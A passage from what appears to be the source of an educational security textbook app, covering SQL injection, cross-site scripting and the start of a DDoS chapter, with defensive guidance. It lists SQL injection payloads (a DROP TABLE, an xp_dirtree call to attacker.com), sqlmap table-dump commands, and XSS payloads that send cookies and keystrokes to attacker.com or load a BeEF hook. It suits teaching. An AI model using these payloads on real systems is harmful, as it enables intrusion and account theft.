                  <div class="tool-row"><span>Blind SQLi</span><span>No direct output; true/false questions</span><span>Boolean-based, Time-based</span></div>
                  <div class="tool-row"><span>Boolean-based Blind</span><span>Observes response differences</span><span>' AND 1=1-- vs ' AND 1=2--</span></div>
                  <div class="tool-row"><span>Time-based Blind</span><span>Causes delays to infer data</span><span>'; WAITFOR DELAY '0:0:5'--</span></div>
                  <div class="tool-row"><span>Out-of-band SQLi</span><span>Uses different channel (DNS, HTTP)</span><span>'; EXEC xp_dirtree '\\attacker.com\share'--</span></div>
                  <div class="tool-row"><span>Second-order SQLi</span><span>Stored, then executed later</span><span>Stored in database, triggered by another query</span></div>
                </div>

                <h4 class="sub-h">Impact of SQL Injection</h4>
                <ul class="content-list">
                  <li><strong>Confidentiality Breach:</strong> Unauthorized access to sensitive data.</li>
                  <li><strong>Integrity Breach:</strong> Modification or deletion of data.</li>
                  <li><strong>Availability Breach:</strong> Dropping tables, shutting down database.</li>
                  <li><strong>Authentication Bypass:</strong> Logging in as admin without credentials.</li>
                  <li><strong>Privilege Escalation:</strong> Gaining higher database privileges.</li>
                  <li><strong>Remote Code Execution:</strong> In some configurations, executing OS commands.</li>
                  <li><strong>Reputation Damage:</strong> Loss of customer trust, legal consequences.</li>
                  <li><strong>Financial Loss:</strong> Fines, remediation costs, lawsuits.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Techniques</span>
                    <ul>
                      <li><strong>Tautologies:</strong> ' OR '1'='1 – always true.</li>
                      <li><strong>Union Queries:</strong> ' UNION SELECT ... – combine results.</li>
                      <li><strong>Comment Injection:</strong> -- or /* */ to terminate query.</li>
                      <li><strong>Stacked Queries:</strong> '; DROP TABLE users; -- – execute multiple statements.</li>
                      <li><strong>Error-Based:</strong> Force errors to reveal information.</li>
                      <li><strong>Boolean-Based Blind:</strong> True/false questions.</li>
                      <li><strong>Time-Based Blind:</strong> Delays to infer data.</li>
                      <li><strong>Out-of-Band:</strong> DNS/HTTP exfiltration.</li>
                      <li><strong>Second-Order:</strong> Stored injection.</li>
                      <li><strong>Authentication Bypass:</strong> admin' -- as username.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Tools Used by Attackers</span>
                    <ul>
                      <li><strong>SQLMap:</strong> Automated SQL injection and database takeover.</li>
                      <li><strong>Burp Suite:</strong> Web proxy with SQLi detection.</li>
                      <li><strong>OWASP ZAP:</strong> Web application scanner.</li>
                      <li><strong>Havij:</strong> Automated SQL injection tool.</li>
                      <li><strong>jSQL Injection:</strong> Java-based SQL injection tool.</li>
                      <li><strong>NoSQLMap:</strong> For NoSQL injection.</li>
                      <li><strong>BBQSQL:</strong> Blind SQL injection tool.</li>
                      <li><strong>Metasploit:</strong> Has SQL injection modules.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Real-World SQL Injection Incidents</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Incident</span><span>Year</span><span>Impact</span></div>
                  <div class="tool-row"><span>Sony Pictures</span><span>2011</span><span>Massive data breach</span></div>
                  <div class="tool-row"><span>TalkTalk</span><span>2015</span><span>157,000 customer records exposed</span></div>
                  <div class="tool-row"><span>Yahoo</span><span>2012</span><span>450,000 credentials stolen</span></div>
                  <div class="tool-row"><span>Heartland Payment Systems</span><span>2008</span><span>130 million card numbers stolen</span></div>
                  <div class="tool-row"><span>Panama Papers</span><span>2016</span><span>Offshore financial data exposed</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Primary Defense: Parameterized Queries (Prepared Statements)</h4>
                <ul class="content-list">
                  <li>Use parameterized queries or prepared statements in all database interactions.</li>
                  <li>Parameters are bound separately from SQL code, so input cannot alter query logic.</li>
                  <li>Supported in all major languages: Java (JDBC), PHP (PDO), Python (sqlite3, psycopg2), .NET (SqlCommand).</li>
                </ul>
                <p><strong>Example (PHP PDO):</strong></p>
                <pre><code>$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
$stmt->execute(['username' => $username, 'password' => $password]);</code></pre>

                <h4 class="sub-h">Input Validation and Sanitization</h4>
                <ul class="content-list">
                  <li>Validate all input on the server side.</li>
                  <li>Use allowlists for expected input.</li>
                  <li>Reject or sanitize unexpected characters.</li>
                  <li>Never rely solely on client-side validation.</li>
                </ul>

                <h4 class="sub-h">Stored Procedures</h4>
                <ul class="content-list">
                  <li>Use stored procedures with parameterized inputs.</li>
                  <li>Avoid dynamic SQL inside stored procedures.</li>
                </ul>

                <h4 class="sub-h">Least Privilege</h4>
                <ul class="content-list">
                  <li>Use a database account with minimal privileges.</li>
                  <li>Do not use <code>sa</code> or <code>root</code> for web applications.</li>
                  <li>Grant only necessary permissions (SELECT, INSERT, UPDATE, DELETE).</li>
                  <li>Avoid DROP, CREATE, xp_cmdshell.</li>
                </ul>

                <h4 class="sub-h">Error Handling</h4>
                <ul class="content-list">
                  <li>Do not display detailed database errors to users.</li>
                  <li>Log errors internally.</li>
                  <li>Show generic error messages.</li>
                </ul>

                <h4 class="sub-h">Web Application Firewall (WAF)</h4>
                <ul class="content-list">
                  <li>Deploy a WAF to detect and block SQL injection attempts.</li>
                  <li>Use signature-based and behavior-based detection.</li>
                  <li>Examples: ModSecurity, Cloudflare WAF, AWS WAF.</li>
                </ul>

                <h4 class="sub-h">Security Testing</h4>
                <ul class="content-list">
                  <li>Regular penetration testing.</li>
                  <li>Automated scanning with SQLMap, Burp Suite, OWASP ZAP.</li>
                  <li>Code reviews focusing on database queries.</li>
                  <li>Static application security testing (SAST).</li>
                  <li>Dynamic application security testing (DAST).</li>
                </ul>

                <h4 class="sub-h">Secure Coding Practices</h4>
                <ul class="content-list">
                  <li>Follow OWASP Top 10 guidelines.</li>
                  <li>Use ORM frameworks that use parameterized queries.</li>
                  <li>Escape special characters if parameterization is not possible.</li>
                  <li>Avoid string concatenation for SQL queries.</li>
                </ul>

                <h4 class="sub-h">Database Hardening</h4>
                <ul class="content-list">
                  <li>Keep database software patched.</li>
                  <li>Disable unnecessary features (xp_cmdshell, OLE Automation).</li>
                  <li>Encrypt sensitive data at rest.</li>
                  <li>Monitor database activity for anomalies.</li>
                  <li>Use database activity monitoring (DAM).</li>
                </ul>

                <h4 class="sub-h">Monitoring and Detection</h4>
                <ul class="content-list">
                  <li>Log all database queries and errors.</li>
                  <li>Monitor for unusual query patterns.</li>
                  <li>Use SIEM to correlate SQL injection attempts.</li>
                  <li>Alert on multiple failed login attempts.</li>
                  <li>Implement rate limiting.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>SQLMap</span><span>Automated SQL injection and takeover</span></div>
                  <div class="tool-row"><span>Burp Suite</span><span>Web proxy with SQLi detection</span></div>
                  <div class="tool-row"><span>OWASP ZAP</span><span>Web application scanner</span></div>
                  <div class="tool-row"><span>Havij</span><span>Automated SQL injection tool</span></div>
                  <div class="tool-row"><span>jSQL Injection</span><span>Java-based SQL injection tool</span></div>
                  <div class="tool-row"><span>NoSQLMap</span><span>NoSQL injection tool</span></div>
                  <div class="tool-row"><span>BBQSQL</span><span>Blind SQL injection tool</span></div>
                  <div class="tool-row"><span>ModSecurity</span><span>Open-source WAF</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>SQLMap Commands</span></div>
                  <pre><code># Enumerate databases
sqlmap -u "http://example.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://example.com/page?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://example.com/page?id=1" -D dbname -T users --dump

# Test POST login
sqlmap -u "http://example.com/login" --data="user=admin&pass=admin" --level=5 --risk=3

# Use saved HTTP request
sqlmap -r request.txt --batch</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>SQL injection exploits improper input handling in database queries.</li>
                  <li>It can lead to data theft, modification, deletion, and authentication bypass.</li>
                  <li>Types: In-band, Error-based, Union-based, Blind, Boolean-based, Time-based, Out-of-band, Second-order.</li>
                  <li>Primary defense: parameterized queries (prepared statements).</li>
                  <li>Other defenses: input validation, least privilege, error handling, WAF, secure coding, monitoring.</li>
                  <li>Tools: SQLMap, Burp Suite, ZAP, Havij, jSQL.</li>
                  <li>Real-world breaches: Sony, TalkTalk, Yahoo, Heartland.</li>
                  <li>Regular testing and code review are essential.</li>
                  <li>Understanding SQL injection is critical for web application security.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://sqlmap.org/" target="_blank" rel="noopener">SQLMap — Automated SQL injection tool</a>
                  <a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite — Web proxy</a>
                  <a href="https://www.zaproxy.org/" target="_blank" rel="noopener">OWASP ZAP — Web application scanner</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — SQL Injection Prevention Cheat Sheet</a>
                  <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger — SQL Injection Labs</a>
                </div>
              </section>
            ` },
                    { id: "4.2", title: "Cross-Site Scripting (XSS)", pages: "345-358", read: 18,
            build: "Find and exploit a reflected XSS vulnerability in a lab environment.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Cross-Site Scripting (XSS)</strong> is a web application vulnerability that allows an attacker to inject malicious client-side scripts into web pages viewed by other users. When a victim loads the compromised page, the malicious script executes in their browser, allowing the attacker to steal session cookies, credentials, redirect the user, deface websites, or perform actions on behalf of the user. XSS is one of the most common web application security flaws, consistently listed in the OWASP Top 10.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A social media platform allows users to post comments. The comment input is not properly sanitized. An attacker posts a comment containing:</p>
                <pre><code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</code></pre>
                <p>When other users view the comment, their browsers execute the script, sending their session cookies to the attacker. The attacker can then hijack their sessions and access their accounts.</p>
                <p>In another example, a search page reflects the search term back to the user without encoding. An attacker crafts a URL like:</p>
                <pre><code>https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
                <p>When a victim clicks the link, the script executes, showing an alert. More malicious scripts could steal data.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. XSS In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/xss.png" alt="Cross-Site Scripting attack flow — malicious script injected into web page, executed in victim's browser" />
                  <figcaption>Figure 4.2 — XSS injects client-side scripts that execute in the victim's browser, bypassing the Same-Origin Policy.</figcaption>
                </figure>

                <h4 class="sub-h">How XSS Works</h4>
                <ul class="content-list">
                  <li>User input is not properly validated or sanitized.</li>
                  <li>The application includes user-supplied data in its output without encoding.</li>
                  <li>The victim's browser trusts and executes the injected script.</li>
                  <li>The attacker's script runs in the context of the vulnerable website, inheriting its origin, cookies, and permissions. This allows the attacker to bypass the Same-Origin Policy.</li>
                </ul>

                <h4 class="sub-h">Types of XSS</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Example</span></div>
                  <div class="tool-row"><span>Reflected XSS</span><span>Malicious script is reflected off the web server in a response.</span><span>https://example.com/search?q=&lt;script&gt;...&lt;/script&gt;</span></div>
                  <div class="tool-row"><span>Stored XSS</span><span>Malicious script is permanently stored on the server.</span><span>Comment containing &lt;script&gt;...&lt;/script&gt;</span></div>
                  <div class="tool-row"><span>DOM-based XSS</span><span>Vulnerability exists in client-side JavaScript.</span><span>document.write(location.hash)</span></div>
                  <div class="tool-row"><span>Self-XSS</span><span>Social engineering trick to paste malicious code.</span><span>Fake "cheat" instructions</span></div>
                  <div class="tool-row"><span>Blind XSS</span><span>Stored and executed later in a different context.</span><span>Contact form viewed by admin</span></div>
                  <div class="tool-row"><span>Mutated XSS (mXSS)</span><span>Browser parsing quirks make safe HTML executable.</span><span>innerHTML manipulations</span></div>
                </div>

                <h4 class="sub-h">Impact of XSS</h4>
                <ul class="content-list">
                  <li><strong>Session Hijacking:</strong> Stealing session cookies to impersonate the user.</li>
                  <li><strong>Credential Theft:</strong> Injecting fake login forms.</li>
                  <li><strong>Data Theft:</strong> Reading sensitive data from the page.</li>
                  <li><strong>Website Defacement:</strong> Modifying page content.</li>
                  <li><strong>Malware Distribution:</strong> Redirecting to malicious sites.</li>
                  <li><strong>Keylogging:</strong> Capturing keystrokes.</li>
                  <li><strong>CSRF Bypass:</strong> Using XSS to perform actions on behalf of the user.</li>
                  <li><strong>Phishing:</strong> Displaying fake alerts or prompts.</li>
                  <li><strong>Crypto Mining:</strong> Running mining scripts in the victim's browser.</li>
                </ul>

                <h4 class="sub-h">XSS vs Other Injection Attacks</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Attack</span><span>Target</span></div>
                  <div class="tool-row"><span>SQL Injection</span><span>Database</span></div>
                  <div class="tool-row"><span>XSS</span><span>User's browser</span></div>
                  <div class="tool-row"><span>Command Injection</span><span>Operating system</span></div>
                  <div class="tool-row"><span>CSRF</span><span>Forces user to perform unwanted actions</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Vectors</span>
                    <ul>
                      <li><strong>Reflected XSS:</strong> Malicious link sent via email, social media, or instant messaging.</li>
                      <li><strong>Stored XSS:</strong> Malicious payload stored in comments, forum posts, user profiles.</li>
                      <li><strong>DOM-based XSS:</strong> Exploiting client-side JavaScript that reads from location, document.URL, etc.</li>
                      <li><strong>Blind XSS:</strong> Payload executed in an admin panel or backend system.</li>
                      <li><strong>Self-XSS:</strong> Tricking users into pasting malicious code.</li>
                      <li><strong>Mutation XSS:</strong> Exploiting browser parsing inconsistencies.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Common Payloads</span>
                    <ul>
                      <li><strong>Cookie Theft:</strong> &lt;script&gt;new Image().src='https://attacker.com/steal?c='+document.cookie;&lt;/script&gt;</li>
                      <li><strong>Keylogger:</strong> &lt;script&gt;document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key);}&lt;/script&gt;</li>
                      <li><strong>Fake Login Form:</strong> &lt;script&gt;document.body.innerHTML='&lt;form action="https://attacker.com/login"&gt;...&lt;/form&gt;';&lt;/script&gt;</li>
                      <li><strong>Redirect:</strong> &lt;script&gt;window.location='https://attacker.com';&lt;/script&gt;</li>
                      <li><strong>Defacement:</strong> &lt;script&gt;document.body.innerHTML='Hacked';&lt;/script&gt;</li>
                      <li><strong>BeEF Hook:</strong> &lt;script src="https://attacker.com/hook.js"&gt;&lt;/script&gt;</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Tools Used by Attackers</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Burp Suite</span><span>Web proxy for testing and exploiting XSS</span></div>
                  <div class="tool-row"><span>OWASP ZAP</span><span>Web application scanner</span></div>
                  <div class="tool-row"><span>BeEF</span><span>Browser Exploitation Framework</span></div>
                  <div class="tool-row"><span>XSSer</span><span>Automated XSS exploitation tool</span></div>
                  <div class="tool-row"><span>XSStrike</span><span>Advanced XSS detection and exploitation</span></div>
                  <div class="tool-row"><span>DalFox</span><span>Fast XSS scanner</span></div>
                  <div class="tool-row"><span>HackBar</span><span>Browser extension for manual testing</span></div>
                </div>

                <h4 class="sub-h">Real-World XSS Incidents</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Incident</span><span>Year</span><span>Impact</span></div>
                  <div class="tool-row"><span>Samy Worm</span><span>2005</span><span>XSS worm on MySpace infected over one million profiles in 20 hours</span></div>
                  <div class="tool-row"><span>Twitter XSS</span><span>2010</span><span>“onMouseOver” worm spread through tweets</span></div>
                  <div class="tool-row"><span>eBay XSS</span><span>2015</span><span>Stored XSS in eBay listings</span></div>
                  <div class="tool-row"><span>British Airways</span><span>2018</span><span>XSS injection led to credit card theft</span></div>
                  <div class="tool-row"><span>Fortnite XSS</span><span>2019</span><span>XSS vulnerability in Epic Games’ login flow</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Primary Defense: Output Encoding</h4>
                <ul class="content-list">
                  <li>Encode all user-supplied data before rendering it in HTML, JavaScript, CSS, or URLs.</li>
                  <li>Use context-aware encoding: HTML entity encoding, JavaScript escaping, URL encoding, CSS escaping.</li>
                  <li>Libraries: OWASP Java Encoder, Microsoft AntiXSS, PHP htmlspecialchars().</li>
                </ul>

                <h4 class="sub-h">Input Validation</h4>
                <ul class="content-list">
                  <li>Validate all input on the server side.</li>
                  <li>Use allowlists for expected input.</li>
                  <li>Reject or sanitize unexpected characters.</li>
                  <li>Never rely solely on client-side validation.</li>
                </ul>

                <h4 class="sub-h">Content Security Policy (CSP)</h4>
                <ul class="content-list">
                  <li>CSP is an HTTP header that restricts the sources from which scripts can be loaded.</li>
                  <li>Example: <code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com</code></li>
                  <li>Prevents inline scripts and unauthorized external scripts.</li>
                  <li>Can block XSS execution even if injection occurs.</li>
                </ul>

                <h4 class="sub-h">HttpOnly and Secure Cookie Flags</h4>
                <ul class="content-list">
                  <li><strong>HttpOnly:</strong> Prevents JavaScript from accessing cookies, mitigating cookie theft via XSS.</li>
                  <li><strong>Secure:</strong> Ensures cookies are only sent over HTTPS.</li>
                  <li><strong>SameSite:</strong> Prevents cookies from being sent with cross-site requests.</li>
                </ul>

                <h4 class="sub-h">Web Application Firewall (WAF)</h4>
                <ul class="content-list">
                  <li>Deploy a WAF to detect and block XSS attempts.</li>
                  <li>Use signature-based and behavior-based detection.</li>
                  <li>Examples: ModSecurity, Cloudflare WAF, AWS WAF.</li>
                </ul>

                <h4 class="sub-h">Secure Coding Practices</h4>
                <ul class="content-list">
                  <li>Avoid using innerHTML, document.write(), eval(), and similar dangerous functions with user input.</li>
                  <li>Use safe alternatives like textContent, createElement(), setAttribute().</li>
                  <li>Sanitize HTML if rich text is required (e.g., DOMPurify).</li>
                  <li>Use frameworks with built-in XSS protection (React, Angular, Vue).</li>
                </ul>

                <h4 class="sub-h">Security Testing</h4>
                <ul class="content-list">
                  <li>Regular penetration testing.</li>
                  <li>Automated scanning with Burp Suite, ZAP, XSStrike, DalFox.</li>
                  <li>Code reviews focusing on output encoding.</li>
                  <li>Static Application Security Testing (SAST).</li>
                  <li>Dynamic Application Security Testing (DAST).</li>
                  <li>Interactive Application Security Testing (IAST).</li>
                </ul>

                <h4 class="sub-h">Monitoring and Detection</h4>
                <ul class="content-list">
                  <li>Log all user input and output.</li>
                  <li>Monitor for unusual script tags or patterns.</li>
                  <li>Use SIEM to correlate XSS attempts.</li>
                  <li>Alert on multiple XSS attempts from same IP.</li>
                  <li>Implement rate limiting.</li>
                </ul>

                <h4 class="sub-h">User Education</h4>
                <ul class="content-list">
                  <li>Train users to recognize phishing links.</li>
                  <li>Avoid clicking suspicious links.</li>
                  <li>Keep browsers updated.</li>
                  <li>Use browser extensions that block scripts (NoScript, uBlock Origin).</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Burp Suite</span><span>Web proxy for XSS testing</span></div>
                  <div class="tool-row"><span>OWASP ZAP</span><span>Web application scanner</span></div>
                  <div class="tool-row"><span>BeEF</span><span>Browser exploitation framework</span></div>
                  <div class="tool-row"><span>XSSer</span><span>Automated XSS tool</span></div>
                  <div class="tool-row"><span>XSStrike</span><span>Advanced XSS detection</span></div>
                  <div class="tool-row"><span>DalFox</span><span>Fast XSS scanner</span></div>
                  <div class="tool-row"><span>HackBar</span><span>Browser extension for manual testing</span></div>
                  <div class="tool-row"><span>DOMPurify</span><span>HTML sanitizer</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>XSS Testing Commands</span></div>
                  <pre><code># Scan for XSS with XSStrike
xsstrike -u "http://example.com/search?q=test"

# Scan with DalFox
dalfox url "http://example.com/search?q=test"

# Automated XSS with XSSer
xsser -u "http://example.com/search?q=test"

# Check CSP header
curl -I https://example.com</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>XSS injects malicious client-side scripts into web pages viewed by others.</li>
                  <li>Types: Reflected, Stored, DOM-based, Self-XSS, Blind, Mutated.</li>
                  <li>Impact: session hijacking, credential theft, defacement, malware distribution.</li>
                  <li>Primary defense: output encoding and input validation.</li>
                  <li>Additional defenses: CSP, HttpOnly/Secure cookies, WAF, secure coding, testing.</li>
                  <li>Tools: Burp Suite, ZAP, BeEF, XSStrike, DalFox, DOMPurify.</li>
                  <li>Real-world incidents: Samy Worm, Twitter, British Airways.</li>
                  <li>Understanding XSS is essential for web application security.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite — Web proxy</a>
                  <a href="https://www.zaproxy.org/" target="_blank" rel="noopener">OWASP ZAP — Web application scanner</a>
                  <a href="https://beefproject.com/" target="_blank" rel="noopener">BeEF — Browser Exploitation Framework</a>
                  <a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">XSStrike — Advanced XSS detection</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — XSS Prevention Cheat Sheet</a>
                </div>
              </section>
            ` },
                    { id: "4.3", title: "Distributed Denial of Service (DDoS)", pages: "359-374", read: 20,
            build: "Simulate a SYN flood in a lab environment and mitigate it with rate limiting.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>A Denial of Service (DoS) attack</strong> is an attempt to make a machine, service, or network resource unavailable to its intended users by overwhelming it with traffic or exploiting a vulnerability that causes it to crash or become unresponsive.</p>
                <p><strong>A Distributed Denial of Service (DDoS) attack</strong> is a DoS attack that uses multiple compromised systems (a botnet) to flood a target with traffic from many different sources. The distributed nature makes it difficult to mitigate because the traffic originates from numerous IP addresses, making it hard to distinguish legitimate traffic from attack traffic. DDoS attacks target the Availability pillar of the CIA Triad.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p><strong>Mirai Botnet Attack on Dyn (2016):</strong> The Mirai botnet infected over 600,000 IoT devices (routers, cameras, DVRs) using default credentials. It launched a massive DDoS attack against Dyn, a major DNS provider. The attack disrupted access to Twitter, Netflix, Reddit, GitHub, and other major websites across the U.S. and Europe for several hours. The attack volume reached over 1 Tbps.</p>
                <p><strong>GitHub DDoS (2018):</strong> GitHub experienced a 1.35 Tbps DDoS attack using memcached amplification. The attack lasted about 20 minutes and was mitigated by Akamai Prolexic.</p>
                <p><strong>AWS DDoS (2020):</strong> Amazon Web Services reported a 2.3 Tbps DDoS attack, the largest ever recorded at the time, using CLDAP reflection.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. DDoS In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/ddos.png" alt="DDoS attack using botnet to flood target with traffic from many sources" />
                  <figcaption>Figure 4.3 — DDoS leverages a botnet of compromised devices to overwhelm a target's resources.</figcaption>
                </figure>

                <h4 class="sub-h">How DDoS Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Botnet Recruitment: Attackers infect many devices (computers, servers, IoT) with malware, turning them into bots (zombies).</div>
                  <div class="step-item"><span class="step-num">2</span> Command and Control (C2): The botmaster sends commands to the bots via C2 servers.</div>
                  <div class="step-item"><span class="step-num">3</span> Attack Launch: Bots simultaneously send large volumes of traffic or requests to the target.</div>
                  <div class="step-item"><span class="step-num">4</span> Resource Exhaustion: The target’s bandwidth, CPU, memory, or connection table is exhausted.</div>
                  <div class="step-item"><span class="step-num">5</span> Service Unavailability: Legitimate users cannot access the service.</div>
                </div>

                <h4 class="sub-h">Types of DDoS Attacks</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Category</span><span>Examples</span></div>
                  <div class="tool-row"><span>Volume-Based (Layer 3/4)</span><span>UDP Flood, ICMP Flood, DNS Amplification, NTP Amplification, Memcached Amplification, SSDP Amplification, CLDAP Amplification</span></div>
                  <div class="tool-row"><span>Protocol-Based (Layer 3/4)</span><span>SYN Flood, ACK Flood, FIN Flood, RST Flood, Ping of Death, Smurf Attack</span></div>
                  <div class="tool-row"><span>Application Layer (Layer 7)</span><span>HTTP Flood, Slowloris, Slow POST, RUDY, DNS Query Flood, XML Bomb, ReDoS</span></div>
                </div>

                <h4 class="sub-h">Amplification and Reflection</h4>
                <ul class="content-list">
                  <li><strong>Reflection:</strong> Attacker sends requests with the victim’s spoofed source IP to many servers. The servers send responses to the victim.</li>
                  <li><strong>Amplification:</strong> The response is much larger than the request, multiplying the attack volume. Common protocols: DNS, NTP, Memcached, SSDP, CLDAP.</li>
                </ul>

                <h4 class="sub-h">DDoS vs DoS</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>DoS</span><span>DDoS</span></div>
                  <div class="tool-row"><span>Source</span><span>Single system</span><span>Multiple systems (botnet)</span></div>
                  <div class="tool-row"><span>Traffic Volume</span><span>Limited</span><span>Massive</span></div>
                  <div class="tool-row"><span>Detection</span><span>Easier</span><span>Harder</span></div>
                  <div class="tool-row"><span>Mitigation</span><span>Simpler</span><span>Complex</span></div>
                  <div class="tool-row"><span>Example</span><span>Single tool</span><span>Mirai botnet</span></div>
                </div>

                <h4 class="sub-h">Impact of DDoS</h4>
                <ul class="content-list">
                  <li><strong>Financial Loss:</strong> Revenue loss, SLA penalties.</li>
                  <li><strong>Reputation Damage:</strong> Customer trust erosion.</li>
                  <li><strong>Operational Disruption:</strong> Services unavailable.</li>
                  <li><strong>Distraction:</strong> Used as a smokescreen for other attacks.</li>
                  <li><strong>Extortion:</strong> Ransom DDoS (RDoS).</li>
                  <li><strong>Competitive Sabotage:</strong> Attacking competitors.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Vectors</span>
                    <ul>
                      <li><strong>Botnet Recruitment:</strong> Phishing, exploit kits, default credentials, malware.</li>
                      <li><strong>C2 Infrastructure:</strong> IRC, HTTP, HTTPS, DNS, P2P.</li>
                      <li><strong>Amplification Lists:</strong> Scanning for open resolvers and amplifiers.</li>
                      <li><strong>Spoofing:</strong> IP spoofing to hide source and enable reflection.</li>
                      <li><strong>Stressers/Booters:</strong> DDoS-for-hire services.</li>
                      <li><strong>Ransom DDoS:</strong> Threatening attacks unless payment is made.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Tools Used by Attackers</span>
                    <ul>
                      <li><strong>LOIC (Low Orbit Ion Cannon):</strong> Simple DDoS tool.</li>
                      <li><strong>HOIC (High Orbit Ion Cannon):</strong> Advanced DDoS tool.</li>
                      <li><strong>Mirai:</strong> IoT botnet malware.</li>
                      <li><strong>hping3:</strong> Packet crafting for floods.</li>
                      <li><strong>Scapy:</strong> Packet crafting in Python.</li>
                      <li><strong>TFN (Tribe Flood Network):</strong> Distributed DoS tool.</li>
                      <li><strong>Trinoo:</strong> Early DDoS tool.</li>
                      <li><strong>Slowloris:</strong> Layer 7 attack tool.</li>
                      <li><strong>GoldenEye:</strong> HTTP flood tool.</li>
                      <li><strong>HULK:</strong> HTTP flood tool.</li>
                      <li><strong>RUDY:</strong> Slow POST tool.</li>
                      <li><strong>Metasploit:</strong> Has DoS modules.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Real-World DDoS Incidents</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Incident</span><span>Year</span><span>Impact</span></div>
                  <div class="tool-row"><span>Mirai</span><span>2016</span><span>1 Tbps+ against Dyn</span></div>
                  <div class="tool-row"><span>GitHub</span><span>2018</span><span>1.35 Tbps memcached</span></div>
                  <div class="tool-row"><span>AWS</span><span>2020</span><span>2.3 Tbps CLDAP</span></div>
                  <div class="tool-row"><span>Cloudflare</span><span>2021</span><span>17.2 million requests per second</span></div>
                  <div class="tool-row"><span>KrebsOnSecurity</span><span>2016</span><span>620 Gbps</span></div>
                  <div class="tool-row"><span>Estonia</span><span>2007</span><span>Nation-state DDoS on government</span></div>
                  <div class="tool-row"><span>Georgia</span><span>2008</span><span>DDoS during conflict</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Detection and Mitigation Strategies</h4>
                <ul class="content-list">
                  <li><strong>Traffic Analysis:</strong> Baseline normal traffic; detect anomalies.</li>
                  <li><strong>Rate Limiting:</strong> Limit requests per IP, per subnet, per service.</li>
                  <li><strong>Blackhole Routing:</strong> Route attack traffic to null interface.</li>
                  <li><strong>Sinkholing:</strong> Redirect attack traffic to analysis servers.</li>
